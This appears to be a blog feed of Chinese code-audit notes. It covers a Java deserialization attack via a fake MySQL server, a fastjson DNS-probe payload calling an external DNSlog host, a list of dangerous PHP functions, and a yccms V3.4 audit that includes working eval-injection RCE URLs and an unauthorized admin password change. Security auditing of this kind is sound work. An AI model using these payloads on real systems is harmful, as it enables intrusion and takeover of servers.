class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">List</span><span style="color: #56B6C2">&lt;</span><span style="color: #C678DD">?</span><span style="color: #56B6C2">&gt;</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">getPersonList</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">Map</span><span style="color: #56B6C2">&lt;</span><span style="color: #E06C75">String</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> String</span><span style="color: #56B6C2">&gt;</span><span style="color: #E06C75"> map) throws Exception{</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> search </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">map</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">get</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Constants</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">SEARCH</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> name </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInfo</span><span style="color: #ABB2BF">(search, </span><span style="color: #98C379">&quot;name&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> type </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInfo</span><span style="color: #ABB2BF">(search, </span><span style="color: #98C379">&quot;type&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> order </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">QueryUtils</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">order</span><span style="color: #ABB2BF">(map);</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">personService</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">select</span><span style="color: #ABB2BF">(name, type, </span><span style="color: #E5C07B">QueryUtils</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">offset</span><span style="color: #ABB2BF">(map), </span><span style="color: #E5C07B">QueryUtils</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">rows</span><span style="color: #ABB2BF">(map));</span></span><span class="line"><span style="color: #E06C75">    }</span></span></code></pre></div></div></figure></li><li><p>后面就和上面SQL注入时分析的一样，漏洞点路径就应该是<code>/person/list?search=</code></p><p>和之前一样</p><ul><li><p>先搭建在公⽹VPS上搭建FakeMysql服务器</p></li><li><p>发送数据包后，我们的smartBi服务器尝试连接fakeMysql服务器，通过反序列化即可成功执⾏命令</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027165105542.png" alt="image-20250812181350575"></p></li><li><p>不多废话，直接展示payload：</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">{&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;3.b3925eed5a.ipv6.1433.eu.org&quot;}</span></span></code></pre></div></div></figure><p><img src="https://lusensec.github.io/img/Code-Audit-%E5%8D%8E%E5%A4%8F-jshERP/image-20241020235518738.png" alt="image-20241020235518738"></p><p>ok，完事。</p></li></ul></li></ol>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Java代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php高危</title>
    <link href="/2025/10/27/php%E9%AB%98%E5%8D%B1/"/>
    <url>/2025/10/27/php%E9%AB%98%E5%8D%B1/</url>
    
    <content type="html"><![CDATA[<ul><li><p>yes 需要  no 不需要</p></li><li><p>文件类型操作</p></li><li><ul><li>file() 函数读取整个文件</li><li>fgets() 读取一行数据</li><li>fgetc() 读取一个字符</li><li>fwrite()函数  可以进行文件写入操作</li><li>file_put_contentt()函数 可以对文件进行写入操作</li><li>file_get_contents()函数 可以进行读取文件 yes</li><li>unlink() 函数  进行文件的删除</li><li>rmdir() 直接删除一个目录</li><li>tempanam() 创建一个临时文件</li><li>tmofile() 创建一个临时文件</li><li>fopen() 函数 打开或者远程读取一个url</li><li>readfile() 输出一个文件</li><li>fread() 读取里面文件，no</li><li>rename 重命名一个文件</li><li>fputs  文件上传类似于fwrite</li></ul></li><li><p>其他 </p></li><li><ul><li><p>目录遍历</p></li><li><ul><li><p>opendir()</p></li><li><p>readdir()</p></li><li><p>closedir() </p></li><li><ul><li>函数都会导致一个目录遍历</li></ul></li></ul></li></ul></li><li><p>命令执行函数</p></li><li><ul><li>exec() 函数 执行命令       yes</li><li>system() 函数    no</li><li>shell_exec() 函数 执行命令              yes</li><li>passthru()函数 执行命令类似于exec      no</li><li>preg_replace()函数 执行命令但是需要&#x2F;e模式</li><li>escapeshellcmd()函数</li><li>popen() 此函数需要写入一个文本当中 &gt; D:&#x2F;1.txt’, ‘r’ ); ?&gt;</li><li>proc_open()</li><li>pcntl_exec()   也是写入一个文件当中pcntl_exec( “&#x2F;bin&#x2F;bash” , array(“whoami”));</li><li>create_funtion()</li><li>array_map()</li></ul></li><li><p>文件包含</p></li><li><ul><li>require()</li><li>include()</li><li>require_once()</li><li>include_once()</li></ul></li><li><p>SSRF漏洞</p></li><li><ul><li>curl_exec()  </li><li>file_get_content()  在内容当中参数可控可以进行SSRF漏洞读取</li><li>fopen()  </li><li>fsockopen()</li></ul></li><li><p>变量覆盖</p></li><li><ul><li>$$</li></ul></li><li><p>反序列化</p></li><li><ul><li>unserialize反序列化函数，参数可控，存在可利用类和魔术方法</li><li>serialize</li></ul></li><li><p>文件下载</p></li><li><ul><li>header(‘Content-Disposition: attachment; filename&#x3D;’.$filename);</li></ul></li><li><p>URL跳转</p></li><li><ul><li>header(“Location:</li></ul></li></ul><p><a href="http://www.baidu.com/">http://www.baidu.com</a>“)</p><ul><li><p>XML外部实体加载</p></li><li><ul><li>PHP XML解析函数</li><li>simplexml_load_file</li><li>simplexml_load_string</li><li>SimpleXMLElement</li></ul></li><li><ul><li>DOMDocument</li><li>xml_parse</li></ul></li><li><p>正则表达式小技巧</p></li><li><ul><li>file_get_contents($this-&gt;([a-zA-Z0-9]+)</li><li>适用于pop链分析</li></ul></li><li><p>文件上传</p></li><li><ul><li><p>$_file[‘file’][‘name’]   客户端上传的原名称</p></li><li><p>$_file[‘file’][‘type’]   文件·类型</p></li><li><p>$_file[‘file’][‘size’]     文件大小</p></li><li><p>$_file[‘file’][‘tmp_name’]    文件上传之后在服务器临时存储的名称</p></li><li><p>$_file[‘file’][‘error’]   上传之后产生的错误代码</p></li><li><ul><li>最终 move_upload_file  进行文件移动</li></ul></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>yccms V3.4审计</title>
    <link href="/2025/10/27/yccms%20V3.4%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/10/27/yccms%20V3.4%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="下载："><a href="#下载：" class="headerlink" title="下载："></a>下载：</h2><p>通过网盘分享的文件：yccms.rar</p><p>链接: <a href="https://pan.baidu.com/s/1f6kZlcEFdnrubGlUKvT8iw">https://pan.baidu.com/s/1f6kZlcEFdnrubGlUKvT8iw</a> 提取码: fw2i</p><p>全局搜索查询版本（define(‘VERSION’, ‘Ver 3.4’);&#x2F;&#x2F;程序版本）</p><h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="1（rce）"><a href="#1（rce）" class="headerlink" title="1（rce）"></a>1（rce）</h3><p>&#x2F;public&#x2F;class&#x2F;Factory.class.php</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">class</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">Factory</span></span><span class="line"><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">    </span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">private</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">$_obj</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">static</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">setAction</span><span style="color: #ABB2BF">(){</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$_a</span><span style="color: #56B6C2">=</span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">::</span><span style="color: #61AFEF">getA</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">in_array</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$_a</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #56B6C2">array</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;admin&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #98C379">&#39;nav&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #61AFEF"> </span><span style="color: #98C379">&#39;article&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;backup&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;html&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;link&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;pic&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;search&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;system&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;xml&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;online&#39;</span><span style="color: #ABB2BF">))) {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">!isset</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$_SESSION</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;admin&#39;</span><span style="color: #ABB2BF">])) {</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #56B6C2">header</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;Location:&#39;</span><span style="color: #ABB2BF">.</span><span style="color: #98C379">&#39;?a=login&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">!file_exists</span><span style="color: #ABB2BF">(ROOT_PATH</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">&#39;/controller/&#39;</span><span style="color: #ABB2BF">.</span><span style="color: #56B6C2">ucfirst</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$_a</span><span style="color: #ABB2BF">)</span><span style="color: #ABB2BF">.</span><span style="color: #98C379">&#39;Action.class.php&#39;</span><span style="color: #ABB2BF">)) </span><span style="color: #E06C75">$_a</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&#39;Login&#39;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #56B6C2">eval</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;self::$_obj = new &#39;</span><span style="color: #ABB2BF">.</span><span style="color: #56B6C2">ucfirst</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$_a</span><span style="color: #ABB2BF">)</span><span style="color: #ABB2BF">.</span><span style="color: #98C379">&#39;Action();&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">self</span><span style="color: #ABB2BF">::</span><span style="color: #E06C75">$_obj</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><ol><li><p>以get输入得到a</p><p>​file_exists（检查文件或目录是否存在，并返回布尔值）  函数检测<br>​ucfirst():将字符串的首字母转换为大写</p></li><li><p>绕过file_exists</p><p>​该函数允许目录存在特殊字符，&#x2F;..&#x2F;将第一个前的内容当作一个目录处理，本身会返回上一个目录（造成了中间字符的逃逸）</p><p>​构造Factory();phpinfo();&#x2F;&#x2F;..&#x2F;,第一个<strong>F</strong>actory用来闭合前面实例化对象，之后就是插入的恶意代码，最后返回上级目录满足目录存在。（<strong>F</strong>actory首字母已经大写）</p></li><li><p>寻找该类在哪被加载（run）</p><p>​config&#x2F;run.inc.php（类的实例化）</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">//单入口</span></span><span class="line"><span style="color: #E5C07B">Factory</span><span style="color: #ABB2BF">::</span><span style="color: #61AFEF">setAction</span><span style="color: #ABB2BF">()-&gt;</span><span style="color: #61AFEF">run</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #C678DD">?</span><span style="color: #56B6C2">&gt;</span></span></code></pre></div></div></figure><p><strong>但是</strong>config&#x2F;run.inc.php文件无法直接访问</p><p>​继续找包含了这个文件的其他可用文件，找到admin&#x2F;index.php、config&#x2F;count.php、search&#x2F;index.php三个文件</p><p>​由于index.php是默认的首页文件，所以通过admin&#x2F;index.php  search&#x2F;index.php 进行利用时可以省略index.php</p></li><li><p>构造</p><p>&#x2F;admin?a&#x3D;Factory();phpinfo();&#x2F;&#x2F;..&#x2F;&#x2F;admin&#x2F;index.php?a&#x3D;Factory();phpinfo();&#x2F;&#x2F;..&#x2F;<br>&#x2F;search?a&#x3D;Factory();phpinfo();&#x2F;&#x2F;..&#x2F;&#x2F;search&#x2F;index.php?a&#x3D;Factory();phpinfo();&#x2F;&#x2F;..&#x2F;</p><p>​   &#x2F;config&#x2F;count.php?a&#x3D;Factory();phpinfo();&#x2F;&#x2F;..&#x2F;</p><p>虽然search&#x2F;index.php未直接调用Factory::setAction()，其他的执行的项目中存在</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$_tpl</span><span style="color: #56B6C2">=</span><span style="color: #E5C07B">TPL</span><span style="color: #ABB2BF">::</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">$_search</span><span style="color: #56B6C2">=</span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">SearchAction</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #E06C75">$_search</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">index</span><span style="color: #ABB2BF">();</span></span></code></pre></div></div></figure><p><del>&#x2F;config?a&#x3D;Factory();phpinfo();&#x2F;&#x2F;..&#x2F;</del></p><p>因为   &#x2F;config?a&#x3D;…→ 并没有 index.php 或没有对应处理逻辑，可能返回 403 或静态内容</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">/admin?a=...` → 路由到 `/admin/index.php</span></span><span class="line"><span style="color: #abb2bf">/search?a=...` → 路由到 `/search/index.php</span></span></code></pre></div></div></figure></li></ol><h3 id="2（未授权管理员密码修改）"><a href="#2（未授权管理员密码修改）" class="headerlink" title="2（未授权管理员密码修改）"></a>2（未授权管理员密码修改）</h3><p>controller&#x2F;AdminAction.class.php（update函数）</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">//修改密码</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">update</span><span style="color: #ABB2BF">(){</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">isset</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$_POST</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;send&#39;</span><span style="color: #ABB2BF">])){</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">validate</span><span style="color: #ABB2BF">::</span><span style="color: #61AFEF">isNullString</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$_POST</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;username&#39;</span><span style="color: #ABB2BF">])) </span><span style="color: #E5C07B">Tool</span><span style="color: #ABB2BF">::</span><span style="color: #61AFEF">t_back</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;用户名不能为空&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;?a=admin&amp;m=update&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">validate</span><span style="color: #ABB2BF">::</span><span style="color: #61AFEF">isNullString</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$_POST</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;password&#39;</span><span style="color: #ABB2BF">])) </span><span style="color: #E5C07B">Tool</span><span style="color: #ABB2BF">::</span><span style="color: #61AFEF">t_back</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;密码不能为空!&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;?a=admin&amp;m=update&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(</span><span style="color: #56B6C2">!</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">validate</span><span style="color: #ABB2BF">::</span><span style="color: #61AFEF">checkStrEquals</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$_POST</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;password&#39;</span><span style="color: #ABB2BF">], </span><span style="color: #E06C75">$_POST</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;notpassword&#39;</span><span style="color: #ABB2BF">]))) </span><span style="color: #E5C07B">Tool</span><span style="color: #ABB2BF">::</span><span style="color: #61AFEF">t_back</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;两次密码不一致!&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;?a=admin&amp;m=update&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">_model</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">username</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">$_POST</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;username&#39;</span><span style="color: #ABB2BF">];</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">_model</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">password</span><span style="color: #56B6C2">=</span><span style="color: #56B6C2">sha1</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$_POST</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;password&#39;</span><span style="color: #ABB2BF">]);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$_edit</span><span style="color: #56B6C2">=</span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">_model</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">editAdmin</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">if</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$_edit</span><span style="color: #ABB2BF">){</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">tool</span><span style="color: #ABB2BF">::</span><span style="color: #61AFEF">layer_alert</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;密码修改成功!&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;?a=admin&amp;m=update&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">6</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span><span style="color: #C678DD">else</span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">tool</span><span style="color: #ABB2BF">::</span><span style="color: #61AFEF">layer_alert</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;密码未修改!&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&#39;?a=admin&amp;m=update&#39;</span><span style="color: #ABB2BF">,</span><span style="color: #D19A66">6</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #ABB2BF"></span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">_tpl</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">assign</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;admin&#39;</span><span style="color: #ABB2BF">, </span><span style="color: #E06C75">$_SESSION</span><span style="color: #ABB2BF">[</span><span style="color: #98C379">&#39;admin&#39;</span><span style="color: #ABB2BF">]);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">_tpl</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">display</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&#39;admin/public/update.tpl&#39;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><ol><li><p>输入username以及password函数转移到editAdmin</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">$_edit</span><span style="color: #56B6C2">=</span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">_model</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">editAdmin</span><span style="color: #ABB2BF">();</span></span></code></pre></div></div></figure></li><li><p>寻找到函数定义（在model&#x2F;AdminModel.class.php）</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">editAdmin</span><span style="color: #ABB2BF">(){</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$_sql</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&quot;</span><span style="color: #C678DD">UPDATE</span></span><span class="line"><span style="color: #98C379">my_admin</span></span><span class="line"><span style="color: #98C379"></span><span style="color: #C678DD">SET</span></span><span class="line"><span style="color: #98C379">username</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&#39;</span><span style="color: #E06C75">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">username</span><span style="color: #98C379">&#39;,</span></span><span class="line"><span style="color: #98C379"></span><span style="color: #C678DD">password</span><span style="color: #56B6C2">=</span><span style="color: #98C379">&#39;</span><span style="color: #E06C75">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">password</span><span style="color: #98C379">&#39;</span></span><span class="line"><span style="color: #98C379"></span><span style="color: #C678DD">WHERE</span></span><span class="line"><span style="color: #98C379">id</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">1</span></span><span class="line"><span style="color: #98C379"></span><span style="color: #C678DD">LIMIT</span><span style="color: #98C379"> </span><span style="color: #D19A66">1</span><span style="color: #98C379">&quot;</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">parent</span><span style="color: #ABB2BF">::</span><span style="color: #61AFEF">update</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$_sql</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure></li><li><p>查看更新函数update($_sql)  （在model&#x2F;Model.class.php）</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">protected</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">update</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$_sql</span><span style="color: #ABB2BF">){</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">return</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">execute</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$_sql</span><span style="color: #ABB2BF">)-&gt;</span><span style="color: #61AFEF">rowCount</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure></li><li><p>使用execute($_sql)执行的sql语句  （在model&#x2F;Model.class.php）</p><figure class="shiki php"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">protected</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">function</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">execute</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$_sql</span><span style="color: #ABB2BF">){</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #C678DD">try</span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$_stmt</span><span style="color: #56B6C2">=</span><span style="color: #E5C07B">$this</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #E06C75">_db</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">prepare</span><span style="color: #ABB2BF">(</span><span style="color: #E06C75">$_sql</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF"></span><span style="color: #E06C75">$_stmt</span><span style="color: #ABB2BF">-&gt;</span><span style="color: #61AFEF">execute</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">}</span><span style="color: #C678DD">catch</span><span style="color: #ABB2BF"> (</span><span style="color: 